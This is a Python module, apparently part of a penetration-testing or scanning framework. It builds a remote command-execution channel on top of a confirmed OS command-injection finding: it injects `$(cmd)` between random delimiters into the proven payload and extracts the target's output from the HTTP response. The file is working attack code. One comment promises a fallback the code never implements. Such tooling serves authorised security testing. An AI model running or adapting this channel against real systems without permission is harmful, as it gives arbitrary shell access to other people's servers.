"""A command channel over a confirmed command-injection finding.

The insight: a confirmed OS-command-injection payload already contains a
working ``echo <marker>`` at the injection site. To run an arbitrary command we
substitute the marker slot with ``<START>$(<cmd>)<END>`` and extract whatever
the target prints between the two random delimiters. This yields a reliable,
low-noise command runner without re-fuzzing the endpoint.

Only OS-command / interpreted-code echo findings support a channel; template
and OOB-only findings do not (no output path), and the channel refuses to build
for them.
"""

from __future__ import annotations

import re
import secrets

from ..engine.models import Finding, InjectionPoint
from ..engine.session import Session

_CHANNEL_ORACLES = {"output"}
_CHANNEL_MODULES = {"cmd_injection", "code_injection"}


class ChannelError(RuntimeError):
    pass


class RCEChannel:
    def __init__(self, session: Session, point: InjectionPoint, finding: Finding):
        if finding.oracle not in _CHANNEL_ORACLES or finding.module not in _CHANNEL_MODULES:
            raise ChannelError(
                "This finding was confirmed via a "
                f"{finding.oracle!r} oracle and does not expose command output. "
                "Interactive command execution needs an output-based "
                "command/code injection finding."
            )
        if finding.marker not in finding.payload:
            raise ChannelError(
                "Cannot derive a command template: the success marker is not "
                "present verbatim in the confirmed payload."
            )
        self.s = session
        self.point = point
        self.finding = finding

    def _wrap(self, cmd: str) -> tuple[str, str, str]:
        start = "S" + secrets.token_hex(4)
        end = "E" + secrets.token_hex(4)
        # Substitute the proven echo argument with delimiter-wrapped command output.
        substitution = f"{start}$({cmd} 2>&1){end}"
        payload = self.finding.payload.replace(self.finding.marker, substitution)
        return payload, start, end

    async def run(self, cmd: str, *, timeout_hint: float = 0.0) -> str:
        payload, start, end = self._wrap(cmd)
        resp = await self.s._send(self.point, payload)
        text = resp.text
        m = re.search(re.escape(start) + r"(.*?)" + re.escape(end), text, re.S)
        if m:
            return m.group(1)
        # Some sinks strip the command-substitution; try a literal fallback.
        raise ChannelError(
            f"No delimited output captured (HTTP {resp.status}). The sink may not "
            "return stdout for this command."
        )

    async def check(self) -> bool:
        """Verify the channel by running a benign identity command."""
        token = secrets.token_hex(4)
        try:
            out = await self.run(f"echo {token}")
        except ChannelError:
            return False
        return token in out
